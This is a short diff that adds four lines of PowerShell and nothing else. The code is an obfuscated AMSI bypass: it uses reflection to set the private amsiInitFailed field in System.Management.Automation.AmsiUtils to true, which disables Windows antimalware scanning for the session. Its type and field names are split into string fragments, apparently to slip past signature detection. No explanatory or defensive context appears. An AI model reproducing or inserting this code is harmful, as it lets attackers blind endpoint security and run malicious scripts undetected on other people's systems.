@@ -1,0 +1,4 @@
+$a=[Ref].Assembly
+$b=$a.GetType('Syste'+'m.Man'+'agemen'+'t.Auto'+'mation.'+'Am'+'si'+'Ut'+'ils')
+$c=$b.GetField('am'+'siIn'+'itFa'+'iled','No'+'nP'+'ub'+'lic,St'+'atic')
+$d=$c.SetValue($null,$true)
